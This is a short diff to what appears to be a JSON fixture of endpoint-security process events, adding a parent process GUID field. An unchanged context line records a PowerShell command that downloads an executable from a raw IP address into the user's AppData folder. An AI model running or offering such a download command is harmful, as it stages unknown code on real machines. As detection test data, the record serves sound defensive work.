@@ -21,6 +21,7 @@
           "commandLine": "powershell.exe -c \"iwr http://45.77.12.8/upd.exe -OutFile $env:APPDATA\\upd.exe\"",
           "processGuid": "{cccc3333-0000-0000-0003-000000000001}",
           "processId": "7020",
+          "parentProcessGuid": "{cccc3333-0000-0000-0003-0000000000e0}",
           "parentImage": "C:\\Windows\\System32\\cmd.exe",
           "user": "CORP\\dlee"
         }
